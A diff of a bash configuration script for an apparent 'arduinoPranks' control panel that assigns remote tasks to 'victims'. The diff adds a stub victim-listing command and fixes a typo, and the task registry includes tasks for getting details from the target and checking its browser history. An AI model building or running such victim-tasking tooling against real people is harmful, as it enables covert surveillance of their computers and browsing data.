@@ -8,10 +8,11 @@ source "$SCRIPTDIR/deploy"
 
 function usage(){
 
-  echo "config option [parameters]"
+  echo "config <option> [parameters]"
   echo "  addTask <taskID> <taskURL>"
   echo "  delTask <taskID>"
   echo "  listTasks"
+  echo "  listVictims"
   echo "  setVictimTask <victim> <taskID>"
   echo "  getVictimTask <victim>"
   echo "  init"
@@ -92,6 +93,14 @@ function setVictimTask() {
 
 ###############################################################################
 
+function listVictims() {
+
+  echo "Not implemented yet!"
+
+}
+
+###############################################################################
+
 function getVictimTask() {
   local victim="$1"
 
@@ -111,7 +120,7 @@ function initialize() {
   addTask default arduinoPranks/master/websiteReactionPrank/task.getDetails
   addTask checkBrowserHistory arduinoPranks/master/websiteReactionPrank/task.checkBrowserHistory
   addTask sleep arduinoPranks/master/websiteReactionPrank/task.sleep
-  addtask status arduinoPranks/master/websiteReactionPrank/task.status
+  addTask status arduinoPranks/master/websiteReactionPrank/task.status
   addTask prototype arduinoPranks/master/websiteReactionPrank/task.prototype
 }
 
@@ -131,6 +140,9 @@ case "$func" in
     ;;
   deltask)
     delTask "$2"
+    ;;
+  listvictims)
+    listVictims
     ;;
   listtasks)
     listTasks
